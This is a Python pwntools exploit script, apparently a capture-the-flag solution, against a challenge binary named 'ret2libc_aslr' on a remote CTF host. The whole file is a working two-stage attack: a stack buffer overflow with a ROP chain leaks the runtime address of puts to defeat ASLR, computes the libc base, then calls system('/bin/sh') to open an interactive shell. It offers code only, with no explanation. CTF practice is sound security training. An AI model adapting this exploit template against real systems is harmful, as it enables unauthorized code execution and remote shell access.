#!/usr/bin/env python3
from pwn import *

context.binary = elf = ELF('./ret2libc_aslr', checksec=False)
libc = ELF('./libc.so.6', checksec=False)

# ── Constants (all fixed: no PIE) ────────────────────────────────────────────
OFFSET    = 72                        # buffer[64] + saved RBP[8]
POP_RDI   = elf.sym['pop_rdi_ret']
RET       = 0x000000000040101a                  # ret gadget for 16-byte alignment
PUTS_PLT  = elf.plt['puts']
PUTS_GOT  = elf.got['puts']
MAIN      = elf.sym['main']

def conn():
    if args.LOCAL:
        return process(elf.path)
    return remote('offsec.m0lecon.it', 13544)

r = conn()

# ── Stage 1: leak puts → compute libc base ───────────────────────────────────
r.recvuntil(b'wish: ')

stage1 = flat(
    b'A' * OFFSET,
    p64(POP_RDI),
    p64(PUTS_GOT),     # rdi = &puts (GOT slot)
    p64(PUTS_PLT),     # call puts(rdi) → prints runtime address of puts
    p64(MAIN),         # loop back for second payload
)
r.sendline(stage1)

r.recvuntil(b'spoken!\n')
puts_addr    = u64(r.recvline().strip().ljust(8, b'\x00'))
log.info(f"puts @ {puts_addr:#x}")

libc.address = puts_addr - libc.sym['puts']
log.info(f"libc base @ {libc.address:#x}")

# ── Stage 2: system("/bin/sh") ───────────────────────────────────────────────
binsh  = next(libc.search(b'/bin/sh\x00'))
system = libc.sym['system']

r.recvuntil(b'wish: ')

stage2 = flat(
    b'A' * OFFSET,
    p64(RET),          # align stack to 16 bytes
    p64(POP_RDI),
    p64(binsh),        # rdi = "/bin/sh\0"
    p64(system),       # call system("/bin/sh")
)
r.sendline(stage2)
r.recvuntil(b'spoken!\n')

r.interactive()